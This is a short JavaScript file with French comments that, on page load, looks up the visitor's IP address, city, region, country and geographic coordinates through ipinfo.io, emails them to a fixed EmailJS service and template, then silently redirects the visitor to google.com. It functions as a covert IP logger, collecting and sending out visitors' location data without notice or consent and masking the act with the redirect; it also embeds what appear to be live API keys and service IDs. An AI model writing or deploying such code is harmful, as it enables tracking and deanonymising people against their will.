window.onload = async function () {
    emailjs.init("PYUYW4IWCVoZ7zYK3"); // Clé publique EmailJS

    try {
        const response = await fetch("https://ipinfo.io/json?token=15f29802768d7e");
        const data = await response.json();
        const now = new Date().toLocaleString();

        console.log("Données récuperees:", data);

        const infos = {
            ip: data.ip,
            ville: data.city,
            region: data.region,
            pays: data.country,
            position: data.loc,
            heure: now
        };

        await emailjs.send("service_9v6pjko", "template_wv5mezn", {
            ip: infos.ip,
            ville: infos.ville,
            region: infos.region,
            pays: infos.pays,
            position: infos.position,
            heure: infos.heure
        });

        window.location.href = "https://www.google.com";

    } catch (error) {
        console.error("Erreur lors de la collecte ou de l’envoi :", error);
    }
};
